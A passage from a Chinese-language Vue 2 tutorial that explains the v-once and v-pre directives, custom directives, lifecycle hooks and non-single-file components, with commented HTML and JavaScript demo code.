**v-once指令**：`v-once` 指令，用于渲染元素和组件一次性的静态内容。当在模板中使用 `v-once` 指令时，Vue 会确保元素和组件只被渲染一次，并且之后的数据更新不会影响到这个元素或组件，即使它依赖的数据发生了改变。使用场景包括但不限于：1.性能优化：对于不需要更新的静态内容，使用 `v-once` 可以减少 Vue 在数据变化时的渲染开销。2.显示初始状态的数据：有时候可能只想显示元素或组件被初始化时的状态，接下来的数据变化不应该影响到这部分内容。使用 `v-once` 指令的方式非常简单，只需要在需要只渲染一次的元素上添加 `v-once` 属性。下面是一个简单的例子：

```html
 <!-- 在这个例子中，即使 laterTitle`发生了变化，首次渲染时的 initialTitle 依旧会保持不变 -->
<template>
  <div>
    <!-- 这里的 h1 标签只会被渲染一次，即使 laterTitle 发生变化，标题也不会更新 -->
    <h1 v-once>{{ initialTitle }}</h1>
    
    <!-- 其它数据变化仍然会触发更新 -->
    <p>{{ laterTitle }}</p>
  </div>
</template>

<script>
export default {
  data() {
    return {
      initialTitle: '这是一个静态标题',
      laterTitle: '这是一个会变化的标题'
    }
  },
  mounted() {
    // 假设有一个操作改变 laterTitle
    setTimeout(() => {
      this.laterTitle = '标题已经改变';
    }, 3000);
  }
}
</script>
```

### 15.5 v-pre指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			v-pre指令：
					1.跳过其所在节点的编译过程。
					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

**`v-pre`指令**：`v-pre`是一个非常简洁且有用的指令。Vue提供了许多指令来声明式地将数据绑定到视图层，例如`v-if`、`v-for`、`v-model`等。然而，有时可能希望Vue忽略某个元素及其子元素，不对它们进行编译。这正是`v-pre`指令发挥作用的时候

**`v-pre`指令的作用**：

- **跳过编译**：使用`v-pre`指令的元素及其所有子节点将被跳过编译过程。这可以用于显示原始Mustache标签（{{ }}），或是提高项目的编译性能，尤其是当有确定不需要动态更新的大块静态内容时
- **性能优化**：当Vue处理模板时，它需要解析指令、插值等表达式。如果已知某个部分的DOM不需要Vue处理，使用`v-pre`可以减少Vue的工作量，因此在某些场景下可用于优化性能

**使用`v-pre`示例**：显示原文Mustache标签

```html
<!-- 显示原文Mustache标签 -->
<!-- 不使用v-pre指令 -->
<!-- 下面代码中的{{ message }}将被Vue解析为变量message的值 -->
<p>{{ message }}</p>
```

```html
<!-- 显示原文Mustache标签 -->
<!-- 使用v-pre -->
<!-- 此时{{ message }}将不会被Vue编译，浏览器中将直接显示文本{{ message }} -->
<p v-pre>{{ message }}</p>


<!-- 性能优化：假设有一个包含大量静态内容的组件，而这部分内容不需要Vue去解析 -->
<!-- 在这个例子中，v-pre指令告诉Vue跳过这个<div>及其子元素的编译过程，可以减少Vue编译时的工作量，从而提升应用性能 -->
<div v-pre>
    <h1>静态标题</h1>
    <p>这是一段长的静态文本，...省略若干文字...</p>
    <!-- 更多静态内容 -->
</div>
```

###  15.5 自定义指令

自定义指令：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
				需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
				自定义指令总结：
						一、定义语法：
									(1).局部指令：
												new Vue({															new Vue({
													directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
												}) 																		})
									(2).全局指令：
													Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)

						二、配置对象中常用的3个回调：
									(1).bind：指令与元素成功绑定时调用。
									(2).inserted：指令所在元素被插入页面时调用。
									(3).update：指令所在模板结构被重新解析时调用。

						三、备注：
									1.指令定义时不加v-，但使用时要加v-；
									2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```

回顾DOM操作

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Document</title>
		<style>
			.demo{
				background-color: orange;
			}
		</style>
	</head>
	<body>
		<button id="btn">点我创建一个输入框</button>
		
		<script type="text/javascript" >
			const btn = document.getElementById('btn')
			btn.onclick = ()=>{
				const input = document.createElement('input')

				input.className = 'demo'
				input.value = 99
				input.onclick = ()=>{alert(1)}
				
				document.body.appendChild(input)

				input.focus()
				// input.parentElement.style.backgroundColor = 'skyblue'
				console.log(input.parentElement)
				
			}
		</script>
	</body>
</html>
```

**自定义指令**：指令是带有 `v-` 前缀的特殊标记，用于在渲染的 DOM 上执行底层 DOM 操作。虽然 Vue 已经提供了一系列的内建指令（如 `v-model`、`v-if` 等），但在某些情况下，可能需要创建自己的自定义指令来实现特定的功能

**创建自定义指令**：自定义指令可以全局定义，也可以在组件中局部定义

- 全局定义：使用 `Vue.directive` 方法可以定义一个全局自定义指令

```javascript
Vue.directive('my-directive', {
  bind(el, binding, vnode, oldVnode) {
    // 一些逻辑...
  },
  inserted(el, binding, vnode, oldVnode) {
    // 一些逻辑...
  },
  update(el, binding, vnode, oldVnode) {
    // 一些逻辑...
  },
  componentUpdated(el, binding, vnode, oldVnode) {
    // 一些逻辑...
  },
  unbind(el, binding, vnode, oldVnode) {
    // 一些逻辑...
  }
});
```

- **局部定义**：在组件中，可以通过在组件选项中使用 `directives` 选项来定义局部自定义指令

```javascript
export default {
  directives: {
    'my-directive': {
      bind(el, binding, vnode) {
        // 一些逻辑...
      }
      // 其他钩子函数...
    }
  }
}
```

**钩子函数**：自定义指令提供了五个钩子函数，可以根据需要来实现它们

- **bind**：只调用一次，指令第一次绑定到元素时调用
- **inserted**：被绑定元素插入父节点时调用（仅保证父节点存在，但不一定已被插入文档中）
- **update**：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前
- **componentUpdated**：指令所在组件的 VNode 及其子 VNode 全部更新后调用
- **unbind**：只调用一次，指令与元素解绑时调用

**使用指令**：定义自定义指令后，可以像使用内建指令一样，在模板中使用它，如：

```html
<!-- someValue是传递给指令的值，它可以是任何 JavaScript 表达式 -->
<!-- someValue是传递给指令的值，它可以是任何 JavaScript 表达式 -->
<div v-my-directive="someValue"></div>
```

##  16. 生命周期

### 16.1 生命周期简介

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				生命周期：
						1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
						2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
						3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
						4.生命周期函数中的this指向是vm 或 组件实例对象。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-if="a">你好啊</h2>
			<h2 :style="{opacity}">欢迎学习Vue</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		 new Vue({
			el:'#root',
			data:{
				a:false,
				opacity:1
			},
			methods: {
				
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				setInterval(() => {
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
		})

		//通过外部的定时器实现（不推荐）
		/* setInterval(() => {
			vm.opacity -= 0.01
			if(vm.opacity <= 0) vm.opacity = 1
		},16) */
	</script>
</html>
```

### 16.2  生命周期演示分析

#####  16.2.1 生命周期演示

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>分析生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root" :x="n">
			<h2 v-text="n"></h2>
			<h2>当前的n值是：{{n}}</h2>
			<button @click="add">点我n+1</button>
			<button @click="bye">点我销毁vm</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
</html>
```

##### 16.2.2 挂载流程

挂载流程图示：

![image-20240404201943757](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122358452.png)

#####  16.2.3  更新流程

更新流程图示：

![image-20240404211326966](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122359974.png)

#####  16.2.4 销毁流程



![image-20240404212642004](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122359994.png)

###  16.3 生命周期总结

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				常用的生命周期钩子：
						1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
						2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

				关于销毁Vue实例
						1.销毁后借助Vue开发者工具看不到任何信息。
						2.销毁后自定义事件会失效，但原生DOM事件依然有效。
						3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
			<button @click="opacity = 1">透明度设置为1</button>
			<button @click="stop">点我停止变换</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		 new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将驾鹤西游了')
			},
		})

	</script>
</html>
```

![image-20240404215823652](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122359825.png)

**Vue组件的生命周期**：在Vue中，每个组件实例都会经历一系列的初始化步骤——例如设置数据监听、编译模板、将实例挂载到DOM上、数据更新时更新DOM等——这些步骤统称为组件的“生命周期”。这些生命周期钩子提供了在不同阶段管理组件的有力工具，可以在创建、更新、销毁组件时执行自定义逻辑。Vue组件的生命周期主要分为以下几个阶段：

**1.创建前/后（Before/After Create）**

- **beforeCreate**：在实例初始化之后、数据观测（data observer）和事件/侦听器配置之前被调用
- **created**：在实例创建完成后被调用，这时候，组件的数据观测、属性和方法的运算、watch/event事件回调已经设置完成，但是挂载阶段还没开始，$el属性目前不可见

**2.挂载前/后（Before/After Mount）**

- **beforeMount**：在挂载开始之前被调用，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用
- **mounted**：在el被新创建的vm.替换，并挂载到实例上去之后调用该钩子。如果根实例挂载了一个文档内元素，当被调用时el也在文档内

**3.更新前/后（Before/After Update）**

- **beforeUpdate**：在数据改变之后、DOM被重新渲染和更新之前被调用，可以在这个钩子中进一步地更改状态，不会触发附加的重渲染过程
- **updated**：在由于数据更改导致的虚拟DOM重新渲染和打补丁之后被调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作

**4.销毁前/后（Before/After Destroy）**

- **beforeDestroy**：在实例销毁之前调用。在这一步，实例仍然完全可用
- **destroyed**：在实例销毁之后调用。调用后，Vue实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁

## 17. Vue组件化编程

### 17.1 模块与组件、模块化与组件化

**模块**：模块是向外提供特定功能的js程序，一般就是一个js文件。模块的作用是复用js，简化js 的编写，提高js运行效率

**组件**：组件是用来实现局部(特定)功能效果的代码集合(html/css/js/image)。组件的作用是复用编码，简化项目编码,提高运行效率

**模块化**：当应用中的js都以模块来编写的,那这个应用就是一个模块化的应用

**组件化**：当应用中的功能都是多组件的方式来编写的,那这个应用就是一个组件化的应用

![image-20240404225204774](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405122359672.png)

![image-20240404225224500](https://cdn.jsdelivr.net/gh/Li-ShiLin/images/vue/202405130000835.png)

在Vue.js中，组件是构建应用的基本单元。Vue提供了两种主要方式来编写组件：单文件组件（Single-File Components，简称SFCs）和非单文件组件。这两种方式各有特点，适用于不同的开发场景

**单文件组件（Single-File Components）**：单文件组件通常以`.vue`扩展名结尾，它们允许将模板、脚本、和样式封装在单个文件中。这种封装方式使得组件更加模块化，易于理解和维护。每个`.vue`文件由三个部分组成：

1. **`<template>`标签：** 用于编写HTML模板。这里定义了组件的结构
2. **`<script>`标签：** 用于编写JavaScript逻辑。这里定义了组件的数据、方法、生命周期钩子等
3. **`<style>`标签：** 用于定义组件的样式。可以是全局样式或通过`scoped`属性定义仅对该组件有效的局部样式

使用单文件组件需要构建工具，如Webpack或Vite，来解析`.vue`文件。这种方式非常适合大型应用开发，因为它提高了代码的组织性和可维护性

**非单文件组件**：与单文件组件不同，非单文件组件不将模板、脚本和样式封装在一个文件中。它们可以是通过Vue的`template`选项直接在JavaScript文件中定义的字符串模板，或者将HTML模板放在HTML文件的`<script>`标签内。样式通常在另外的CSS文件中定义。非单文件组件的优点是简单易于理解，不需要构建工具就可以快速开始开发，非常适合小型项目或快速原型开发。然而，随着应用规模的增长，维护这样的代码会变得更加困难。非单文件组件的示例：

```html
<div id="app">
  <!-- 这里是组件的模板 -->
  <my-component></my-component>
</div>

<script>
  // 这里定义组件
  Vue.component('my-component', {
    template: '<div>A non-single-file component</div>'
  });

  new Vue({
    el: '#app'
  });
</script>
```

### 17.2 非单文件组件

#####  17.2.1 组件的基本使用

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			Vue中使用组件的三大步骤：
					一、定义组件(创建组件)
					二、注册组件
					三、使用组件(写组件标签)

			一、如何定义一个组件？
						使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
						区别如下：
								1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
								2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
						备注：使用template可以配置组件结构。

			二、如何注册组件？
							1.局部注册：靠new Vue的时候传入components选项
							2.全局注册：靠Vue.component('组件名',组件)

			三、编写组件标签：
							<school></school>
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<hello></hello>
			<hr>
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>

		<div id="root2">
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
			// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			},
			methods: {
				showName(){
					alert(this.schoolName)
				}
			},
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'张三',
					age:18
				}
			}
		})
		
		//第一步：创建hello组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
			}
		})
		
		//第二步：全局注册组件
		Vue.component('hello',hello)

		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好啊！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school,
				student
			}
		})

		new Vue({
			el:'#root2',
		})
	</script>
</html>
```

**Vue 组件的基本使用**：

1.**定义组件**：可以通过 Vue 的 `Vue.component` 方法或者在 `.vue` 文件中定义一个组件。`.vue` 文件的方式需要结合 Vue 单文件组件 (SFC) 和构建工具（如 Vue CLI、Vite 或 Webpack）使用

1.2 **通过 `Vue.component` 方法定义**:

```javascript
Vue.component('my-component', {
  // 选项
  template: '<div>A custom component!</div>'
})
```

1.3 **在 `.vue` 文件中定义**:

```vue
<template>
  <div>A custom component!</div>
</template>

<script>
export default {
  // 选项
}
</script>

<style>
/* 样式 */
</style>
```

2.**注册组件**：组件可以是全局注册的，也可以是局部注册的。全局注册的组件可以在任何新创建的 Vue 根实例的模板中被用作自定义元素。局部注册的组件只能在其注册所在的组件中使用

2.1 **全局注册**:

```javascript
Vue.component('my-global-component', {
  // 选项
})
```

2.2 **局部注册**:

```javascript
var MyComponent = {
  // 选项
}

new Vue({
  el: '#app',
  components: {
    'my-component': MyComponent
  }
})
```

3.**使用组件**：定义和注册组件后，可以在 Vue 的模板中像使用普通 HTML 元素一样使用它们

```html
<div id="app">
  <my-component></my-component>
</div>
```

3.1 **传递数据**：组件之间的数据传递主要通过 props （从父组件向子组件传递）和 events （子组件向父组件发送消息）进行

- **Props**：

```vue
Vue.component('child', {
  // 声明 props
  props: ['message'],
  // 就像 data 一样，prop 可以用在模板内
  // 同样也可以在 vm 实例中像 “this.message” 这样使用
  template: '<span>{{ message }}</span>'
})
```

```html
<child message="hello!"></child>
```

- **Events**：子组件可以通过调用内建的 `$emit` 方法触发事件，并将消息发送给父组件

```vue
Vue.component('child', {
  template: '<button @click="$emit(\'child-event\')">Click me</button>'
})
```

父组件监听这个事件：

```html
<child @child-event="doSomething"></child>
```

#####  17.2.2 组件的命名

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>几个注意点</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			几个注意点：
					1.关于组件名:
								一个单词组成：
											第一种写法(首字母小写)：school
											第二种写法(首字母大写)：School
								多个单词组成：
											第一种写法(kebab-case命名)：my-school
											第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
								备注：
										(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
										(2).可以使用name配置项指定组件在开发者工具中呈现的名字。

					2.关于组件标签:
								第一种写法：<school></school>
								第二种写法：<school/>
								备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

					3.一个简写方式：
								const school = Vue.extend(options) 可简写为：const school = options
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>{{msg}}</h1>
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义组件
		const s = Vue.extend({
			name:'atguigu',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			}
		})

		new Vue({
			el:'#root',
			data:{
				msg:'欢迎学习Vue!'
			},
			components:{
				school:s
			}
		})
	</script>
</html>
```

**Vue组件命名**：Vue 组件可以通过两种主要方式命名：**kebab-case** 和 **PascalCase**

1.**Kebab-case**：Kebab-case 是使用连字符（-）连接单词的一种命名方式，例如 `my-component`。在 HTML 模板中直接使用组件时，推荐使用 kebab-case 命名。这是因为 HTML 标签不区分大小写，使用 kebab-case 可以保持一致性和清晰度

```html
<template>
  <div>
    <my-custom-component></my-custom-component>
  </div>
</template>
```

在 JavaScript 中定义组件时，可以使用字符串定义组件名，这里同样适用 kebab-case：

```javascript
Vue.component('my-custom-component', {
  // options
})
```

2.**PascalCase**：PascalCase 是首字母大写的驼峰命名法，例如 `MyComponent`。在 JavaScript 中定义组件时，尤其是在使用单文件组件（.vue 文件）时，推荐使用 PascalCase

```vue
<script>
export default {
  name: 'MyCustomComponent',
  // 其他选项
}
</script>
```

在模板中使用 PascalCase：

```html
<template>
  <div>
    <MyCustomComponent></MyCustomComponent>
  </div>
</template>
```

**命名最佳实践**：

- 在模板中引用这种组件时，可以使用 PascalCase 或 kebab-case。但是，如果模板是字符串（例如在通过 `template` 选项或在直接写在 JavaScript 中的模板），由于 HTML 不区分大小写，应该使用 kebab-case 来引用组件

- 单文件组件文件名：使用 `.vue` 文件时，文件名推荐使用 PascalCase。这样做可以一眼区分组件文件和其他类型的文件，例如 `MyComponent.vue`
- 全局注册 vs. 局部注册：对于全局注册的组件，可能更倾向于使用 kebab-case，因为这些组件在模板中直接以 HTML 标签的形式出现。对于局部注册的组件，由于它们主要在 JavaScript 中使用，因此推荐使用 PascalCase
- 一致性：无论选择哪种命名方式，保持一致性是最重要的。如果团队中有已经建立的约定，应该遵循这些约定

##### 17.2.3 组件的嵌套

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>组件的嵌套</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//定义student组件
		const student = Vue.extend({
			name:'student',
			template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					age:18
				}
			}
		})
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			//注册组件（局部）
			components:{
				student
			}
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`<h1>{{msg}}</h1>`,
			data(){
				return {
					msg:'欢迎来到尚硅谷学习！'
				}
			}
		})
		
		//定义app组件
		const app = Vue.extend({
			template:`
				<div>	
					<hello></hello>
					<school></school>
				</div>
			`,
			components:{
				school,
				hello
			}
		})

		//创建vm
		new Vue({
			template:'<app></app>',
			el:'#root',
			//注册组件（局部）
			components:{app}
		})
	</script>
</html>
```

**组件的嵌套**：组件可以嵌套在其它组件中，形成一个树状的组件层次结构，这有助于组织和分隔复杂的应用界面。在 Vue 中，每个组件实质上是一个拥有预定义选项的 Vue 实例。组件可以包括模板、脚本、和样式。当把组件嵌套在另一个组件中时，就可以构建出更为复杂的应用界面

1.创建组件：要在 Vue 中创建一个组件，可以使用 `Vue.component(tagName, options)` 方法，其中 `tagName` 是组件的名称，`options` 是一个包含组件选项的对象（如模板、数据、方法等）

```javascript
// 子组件
Vue.component('child-component', {
  template: '<div>A child component</div>'
});
```

2.使用组件：定义组件后可以像使用普通 HTML 元素一样，在 Vue 应用的模板中使用这个组件

```html
<div id="app">
  <child-component></child-component>
</div>
```

3.嵌套组件：组件嵌套意味着在一个组件的模板内部使用另一个组件。这是通过在父组件的模板中包含子组件的标签来实现的

```javascript
// 父组件
Vue.component('parent-component', {
  template: `
    <div>
      <h1>A parent component</h1>
      <child-component></child-component>
    </div>
  `
});
```

4.在 Vue 应用中使用嵌套的父组件

```html
<div id="app">
  <parent-component></parent-component>
</div>
```

5.数据传递：在组件嵌套的情况下，通常需要将数据从父组件传递到子组件。这可以通过 props 实现

```html
<!-- 父组件模板 -->
<child-component :some-prop="dataForChild"></child-component>
```

```javascript
// 子组件定义
Vue.component('child-component', {
  props: ['someProp'],
  template: '<div>{{ someProp }}</div>'
});
```

6.事件处理：子组件可以通过 `$emit` 方法触发事件，父组件可以监听这些事件。这样，子组件就可以将信息传递回父组件

```javascript
// 子组件
methods: {
  someMethod() {
    this.$emit('some-event', 'some data');
  }
}
```

```html
<!-- 父组件模板 -->
<child-component @some-event="handleEvent"></child-component>
```

##### 17.2.4 VueComponent

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>VueComponent</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			关于VueComponent：
						1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

						2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
							即Vue帮我们执行的：new VueComponent(options)。

						3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

						4.关于this指向：
								(1).组件配置中：
											data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
								(2).new Vue(options)配置中：
											data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

						5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
							Vue的实例对象，以后简称vm。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<school></school>
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showName">点我提示学校名</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showName(){
					console.log('showName',this)
				}
			},
		})

		const test = Vue.extend({
			template:`<span>atguigu</span>`
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`
				<div>
					<h2>{{msg}}</h2>
					<test></test>	
				</div>
			`,
			data(){
				return {
					msg:'你好啊！'
				}
			},
			components:{test}
		})


		// console.log('@',school)
		// console.log('#',hello)

		//创建vm
		const vm = new Vue({
			el:'#root',
			components:{school,hello}
		})
	</script>
</html>
```

**VueComponent** ：`VueComponent` 是 Vue 的一个重要部分，它是 Vue 应用中的基本构建块。每个 Vue 组件都是一个拥有预定义选项的 Vue 实例。组件可以包含自己的模板、数据、方法、生命周期钩子和其他业务逻辑。可以通过组件来封装和复用代码，在不同的项目或项目的不同部分之间共享功能

1.创建 VueComponent：Vue 组件可以通过多种方式创建，最基本的方式是使用 `Vue.extend()` 方法或者直接在 Vue 实例中通过 `components` 选项定义

1.1 使用 Vue.extend()创建 VueComponent

```javascript
var MyComponent = Vue.extend({
  // 选项
  template: '<div>A custom component!</div>'
})

// 创建一个 MyComponent 实例
new MyComponent().$mount('#app')
```

1.2 在 Vue 实例中定义VueComponent

```javascript
var vm = new Vue({
  el: '#app',
  components: {
    'my-component': {
      template: '<div>A custom component!</div>'
    }
  }
})
```

1.3 组件的组成部分

- **模板（Template）**：定义了组件的 HTML 结构
- **脚本（Script）**：定义了组件的逻辑，比如数据、方法等
- **样式（Style）**：定义了组件的外观

1.4 局部和全局组件：Vue 允许定义全局组件和局部组件

- **全局组件**：一旦使用 `Vue.component` 定义了全局组件，它可以在任何新创建的 Vue 根实例（new Vue）的模板中被多次使用，无需再次注册
- **局部组件**：通过在 Vue 实例的 `components` 选项中定义，仅可在该实例或通过该实例创建的子组件中使用

#####  17.2.5 重要的内置关系

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>一个重要的内置关系</title>
		<!-- 引入Vue -->
